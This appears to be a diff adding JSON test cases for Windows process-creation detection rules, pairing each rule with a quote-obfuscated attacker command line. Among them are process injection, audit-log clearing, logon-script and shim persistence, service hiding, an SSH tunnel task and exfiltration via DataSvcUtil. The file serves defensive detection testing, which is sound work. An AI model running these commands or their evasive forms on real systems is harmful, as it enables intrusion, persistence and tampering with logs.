+        "target_rule":  "proc_creation_win_nltest_recon",
+        "technique_id":  "T1016"
+    },
+    {
+        "test_id":  "proc_creation_win_nltest_recon_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\nltest.EXE /trust\"\"ed_domains",
+        "target_rule":  "proc_creation_win_nltest_recon",
+        "technique_id":  "T1016"
+    },
+    {
+        "test_id":  "proc_creation_win_net_use_mount_share_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.exe\tuse\t\\\\127.0.0.1\\share",
+        "target_rule":  "proc_creation_win_net_use_mount_share",
+        "technique_id":  "T1021.002"
+    },
+    {
+        "test_id":  "proc_creation_win_net_use_mount_share_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.exe \"use\" \"\\\\127.0.0.1\\share\"",
+        "target_rule":  "proc_creation_win_net_use_mount_share",
+        "technique_id":  "T1021.002"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_without_parameters_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\rundll32.exe",
+        "target_rule":  "proc_creation_win_rundll32_without_parameters",
+        "technique_id":  "T1021.002"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_mavinject_process_injection_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c mavinject.exe 1000 \"/INJECTRUNNING\" \"C:\\AtomicRedTeam\\atomics\\T1218\\src\\x64\\T1218.dll\"",
+        "target_rule":  "proc_creation_win_lolbin_mavinject_process_injection",
+        "technique_id":  "T1055.001"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_mavinject_process_injection_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c mavinject.exe 1000 /INJECTRUNNING\t\"C:\\AtomicRedTeam\\atomics\\T1218\\src\\x64\\T1218.dll\"",
+        "target_rule":  "proc_creation_win_lolbin_mavinject_process_injection",
+        "technique_id":  "T1055.001"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_tracker_curated_1",
+        "target_commandline":  "C:\\AtomicRedTeam\\tracker.exe \"/d\" C:\\Temp\\payload.dll \"/c\" calc.exe",
+        "target_rule":  "proc_creation_win_lolbin_tracker",
+        "technique_id":  "T1055.001"
+    },
+    {
+        "test_id":  "proc_creation_win_iis_appcmd_http_logging_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config /section:\"httplogging\" /dontLog:true",
+        "target_rule":  "proc_creation_win_iis_appcmd_http_logging",
+        "technique_id":  "T1562.002"
+    },
+    {
+        "test_id":  "proc_creation_win_iis_appcmd_http_logging_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config /section:httplogging /dontLog:\"true\"",
+        "target_rule":  "proc_creation_win_iis_appcmd_http_logging",
+        "technique_id":  "T1562.002"
+    },
+    {
+        "test_id":  "proc_creation_win_auditpol_susp_execution_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\auditpol.exe /c\"l\"ear /y",
+        "target_rule":  "proc_creation_win_auditpol_susp_execution",
+        "technique_id":  "T1562.002"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil_curated_1",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\DataSvcUtil.exe /\"out\":C:\\temp\\test.txt /\"uri\":http://127.0.0.1/",
+        "target_rule":  "proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil",
+        "technique_id":  "T1567"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil_curated_2",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\DataSvcUtil.exe /o\"u\"t:C:\\temp\\test.txt /u\"r\"i:http://127.0.0.1/",
+        "target_rule":  "proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil",
+        "technique_id":  "T1567"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_extrac32_ads_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\extrac32 C:\\temp\\payload.cab C:\\temp\\file.txt:stream",
+        "target_rule":  "proc_creation_win_lolbin_extrac32_ads",
+        "technique_id":  "T1564.004"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_extrac32_ads_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\extra\"\"c32.exe C:\\temp\\payload.cab C:\\temp\\file.txt:stream",
+        "target_rule":  "proc_creation_win_lolbin_extrac32_ads",
+        "technique_id":  "T1564.004"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_ntfs_short_name_path_use_cli_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c \"dir C:\\PROGRA~1\"",
+        "target_rule":  "proc_creation_win_susp_ntfs_short_name_path_use_cli",
+        "technique_id":  "T1564.004"
+    },
+    {
+        "test_id":  "proc_creation_win_fsutil_drive_enumeration_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\fsutil.EXE fsinfo dr\"\"ives",
+        "target_rule":  "proc_creation_win_fsutil_drive_enumeration",
+        "technique_id":  "T1120"
+    },
+    {
+        "test_id":  "proc_creation_win_fsutil_drive_enumeration_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\fsutil.EXE fsinfo d\"r\"ives",
+        "target_rule":  "proc_creation_win_fsutil_drive_enumeration",
+        "technique_id":  "T1120"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_accesschk_check_permissions_curated_1",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\sysinternals\\accesschk.exe -u\"w\"cqv user1 *",
+        "target_rule":  "proc_creation_win_sysinternals_accesschk_check_permissions",
+        "technique_id":  "T1069.001"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_hiding_malware_in_fonts_folder_curated_1",
+        "target_commandline":  "cmd.exe /c copy C:\\temp\\payload.exe %SystemRoot%\\Fonts\\payload.exe",
+        "target_rule":  "proc_creation_win_susp_hiding_malware_in_fonts_folder",
+        "technique_id":  "T1211"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_network_sniffing_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\Wireshark\\tshark.exe\" \"-\"i eth0",
+        "target_rule":  "proc_creation_win_susp_network_sniffing",
+        "technique_id":  "T1040"
+    },
+    {
+        "test_id":  "proc_creation_win_certmgr_certificate_installation_curated_1",
+        "target_commandline":  "\"C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.26100.0\\x64\\certmgr.exe\" /a\"\"dd C:\\Temp\\TestRootCA.cer /s /r localMachine root",
+        "target_rule":  "proc_creation_win_certmgr_certificate_installation",
+        "technique_id":  "T1553.004"
+    },
+    {
+        "test_id":  "proc_creation_win_w32tm_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\W32tm.EXE /\"stripchart\" /\"computer\":localhost /\"period\":5 /\"dataonly\" /\"samples\":2",
+        "target_rule":  "proc_creation_win_w32tm",
+        "technique_id":  "T1124"
+    },
+    {
+        "test_id":  "proc_creation_win_browsers_remote_debugging_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" \"--remote-debugging-address=127.0.0.1\" \"--remote-debugging-port=9222\"",
+        "target_rule":  "proc_creation_win_browsers_remote_debugging",
+        "technique_id":  "T1185"
+    },
+    {
+        "test_id":  "proc_creation_win_takeown_recursive_own_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\takeown.exe \"/f\" C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1222.001_takeown_folder \"/r\"",
+        "target_rule":  "proc_creation_win_takeown_recursive_own",
+        "technique_id":  "T1222.001"
+    },
+    {
+        "test_id":  "proc_creation_win_registry_logon_script_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\REG.exe ADD HKCU\\Environment /v \"UserInitMpr\"\"LogonScript\" /t REG_SZ /d C:\\Users\\bkcs\\AppData\\Local\\Temp\\art.bat /f",
+        "target_rule":  "proc_creation_win_registry_logon_script",
+        "technique_id":  "T1037.001"
+    },
+    {
+        "test_id":  "proc_creation_win_pua_advancedrun_curated_1",
+        "target_commandline":  "C:\\Tools\\AdvancedRun.exe \"/EXEFilename\" C:\\Windows\\System32\\cmd.exe \"/Run\"",
+        "target_rule":  "proc_creation_win_pua_advancedrun",
+        "technique_id":  "T1564.003"
+    },
+    {
+        "test_id":  "proc_creation_win_explorer_folder_shortcut_via_shell_binary_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\explorer.exe shell:\"mycomputerfolder\"",
+        "target_rule":  "proc_creation_win_explorer_folder_shortcut_via_shell_binary",
+        "technique_id":  "T1135"
+    },
+    {
+        "test_id":  "proc_creation_win_schtasks_guid_task_name_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\schtasks.exe /Cre\"ate\" /TN \"{12345678-1234-1234-1234-123456789012}\" /TR calc.exe",
+        "target_rule":  "proc_creation_win_schtasks_guid_task_name",
+        "technique_id":  "T1053.005"
+    },
+    {
+        "test_id":  "proc_creation_win_schtasks_openssh_tunnelling_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\schtasks.exe \"/create\" /tn \"TestTask1\" /tr \"C:\\Windows\\System32\\OpenSSH\\ssh.exe -i C:\\Temp\\test.txt user@192.0.2.10\" /sc daily",
+        "target_rule":  "proc_creation_win_schtasks_openssh_tunnelling",
+        "technique_id":  "T1053.005"
+    },
+    {
+        "test_id":  "proc_creation_win_sdbinst_shim_persistence_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\sdbinst.exe \"C:\\AtomicRedTeam\\atomics\\T1546.011\\bin\\AtomicShimx86.sd\"\"b\"",
+        "target_rule":  "proc_creation_win_sdbinst_shim_persistence",
+        "technique_id":  "T1546.011"
+    },
+    {
+        "test_id":  "proc_creation_win_msxsl_remote_execution_curated_1",
+        "target_commandline":  "C:\\Tools\\msxsl_\\_bin\\Release_x64\\msxsl.exe h\"\"ttp://127.0.0.1/file.xml",
+        "target_rule":  "proc_creation_win_msxsl_remote_execution",
+        "technique_id":  "T1220"
+    },
+    {
+        "test_id":  "proc_creation_win_net_user_add_never_expire_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.exe u\"se\"r test /a\"d\"d /expires:never",
+        "target_rule":  "proc_creation_win_net_user_add_never_expire",
+        "technique_id":  "T1136.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_use_network_connections_discovery_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE \"sessions\"",
+        "target_rule":  "proc_creation_win_net_use_network_connections_discovery",
+        "technique_id":  "T1049"
+    },
+    {
+        "test_id":  "proc_creation_win_sc_sdset_hide_sevices_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\sc.EXE s\"d\"set AtomicService \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"",
+        "target_rule":  "proc_creation_win_sc_sdset_hide_sevices",
+        "technique_id":  "T1574.011"
+    },
+    {
+        "test_id":  "proc_creation_win_curl_local_file_read_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\curl.exe \"file:\"///C:/Windows/win.ini",
+        "target_rule":  "proc_creation_win_curl_local_file_read",
+        "technique_id":  "T1005"
+    }
+]
